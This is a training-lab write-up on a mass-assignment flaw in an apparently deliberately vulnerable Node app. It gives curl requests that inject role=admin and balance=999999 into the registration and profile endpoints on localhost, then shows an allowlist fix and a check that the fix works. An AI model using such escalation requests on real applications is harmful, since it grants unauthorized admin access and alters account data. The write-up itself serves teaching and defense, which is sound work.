# Lab 04: Mass assignment → admin

Registration and the profile form forward the whole request body to the database layer. Any field — including `role` and `balance` — is written to the user row.

**OWASP Top 10:2025:** [A06 Insecure Design](https://owasp.org/Top10/2025/)

**Code:** `routes/auth.js` (`/register`), `routes/account.js` (`/account`), `model/db.js` (`updateProfile`), `views/register.ejs`

## Exploit

1. Register as admin. The register form shows a `role` field (the lab makes the vector obvious):

```bash
curl -s -X POST http://localhost:8888/register \
  -d "username=pwn&password=pwn123&role=admin"
```

2. In a real app the form would not render that field. It would not matter — send the field anyway:

```bash
curl -s -X POST http://localhost:8888/register \
  -d "username=pwn2&password=pwn123&email=x@x.com" \
  -d "role=admin&balance=999999"
```

3. Promote an existing account from the profile form (log in as alice, then):

```bash
curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
  -d "username=alice" -d "password=alice123"          # get a session

curl -s -b cookies.txt -X POST http://localhost:8888/account \
  --data "email=alice%40example.com" --data "role=admin" --data "balance=999999"
```

4. Confirm the escalation:

```bash
docker compose exec db psql -U nodebazaar -d nodebazaar \
  -c "SELECT username, role, balance FROM users WHERE username = 'alice';"
# alice | admin | 999999
```

The Account page now shows role `admin` and balance 9,999.99 € — and if an admin area existed, she would be in.

## Why it happens

`req.body` → database without an allowlist. The form does not render a field? Send it anyway — the server never checks. Framework model binders make this a one-line bug (`Object.assign(user, req.body)` is the same disease).

## Fix

Bind explicitly, field by field:

```js
// routes/account.js
await db.updateProfile(req.session.userId, {
  username: req.body.username,
  email: req.body.email,
});

// model/db.js — build the SET clause only from an allowlist
const ALLOWED = ["username", "email"];
```

Bonus hardening: derive `role` changes from a dedicated admin-only flow, never from a shared handler.

## Verify

After the fix, `role=admin` in the POST changes nothing; `req.session.role` stays `customer`.